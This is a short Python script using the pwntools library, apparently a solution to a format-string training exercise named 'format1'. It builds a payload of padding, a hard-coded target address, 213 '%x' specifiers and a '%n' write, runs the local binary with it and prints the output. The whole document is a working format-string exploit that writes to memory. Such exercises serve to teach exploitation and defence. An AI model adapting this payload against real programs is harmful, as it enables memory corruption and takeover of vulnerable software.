from pwn import *

address = "\x38\x96\x04\x08"
payload = "AAAAAAA" + address + 'BB' +"%x " * 213 + "%n"

p = process(["./format1", payload])
output = p.recvall()
print(output)